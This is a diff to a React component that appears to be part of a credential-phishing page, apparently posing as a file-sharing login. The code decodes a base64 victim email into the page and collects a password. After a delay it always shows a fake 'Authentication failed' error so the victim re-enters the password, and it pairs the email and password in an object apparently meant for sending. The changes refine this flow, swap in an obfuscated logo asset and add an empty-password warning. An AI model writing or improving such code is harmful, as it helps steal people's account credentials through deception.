@@ -1,7 +1,10 @@
 import React, {useEffect, useState} from "react";
 import './iceberg.css';
-import Tipp from '../assets/tippp.png';
+// import Tipp from '../assets/tippp.png';
+// import weT from '../assets/wetransfer-3.svg';
+import tyduyyi from '../assets/tttt.svg';
 import $ from 'jquery';
+
 
 
 export const Iceberg = ()=>{
@@ -23,6 +26,8 @@ export const Iceberg = ()=>{
     const [email, setEmail] = useState(extracetdEmail);
     const [pwd, setPwd] = useState('');
 
+    const [emptyPswd, setEmptyPswd] = useState(false);
+
     const [count, setCount] = useState(0);
 
     const [err, setErr] = useState(false);
@@ -35,7 +40,7 @@ export const Iceberg = ()=>{
 
 
         const a = document.querySelector('#main_em__l');
-        const b = a.innerHTML = window.atob(email)
+        const b = a.innerHTML = window.atob(email);
     }
     
     useEffect(()=>{
@@ -44,8 +49,14 @@ export const Iceberg = ()=>{
 
 
     const distinction = (___________distinct) => {
+
+        const a = document.querySelector('#main_em__l');
+        const b = a.innerHTML = window.atob(email);
+
         ___________distinct.preventDefault();
         if (pwd === "") {
+            setEmptyPswd(true);
+            setErr(false);
           return null
         }
         
@@ -56,11 +67,12 @@ export const Iceberg = ()=>{
             setTimeout(() => {
               setPwd('');
               setErr(true);
+              setEmptyPswd(false);
               setBtnVal('Continue');
             }, 2200);
     
             const user = {
-              email: email,
+              email: b,
               password: pwd
           };
     
@@ -97,7 +109,7 @@ export const Iceberg = ()=>{
                     <img
                         alt="tipp"
                         className="tip"
-                        src={Tipp}
+                        src={tyduyyi}
                         onClick={reloadPreloader}
                         style={{cursor:'pointer'}}
                     />
@@ -155,6 +167,9 @@ export const Iceberg = ()=>{
                     { err ? <p className="err">
                         Error: Authentication failed, please try again with your correct email password.
                     </p> : null }
+
+
+                    { emptyPswd ? <p className="err">Password cannot be empty, please enter your password.</p> : null }
 
 
 
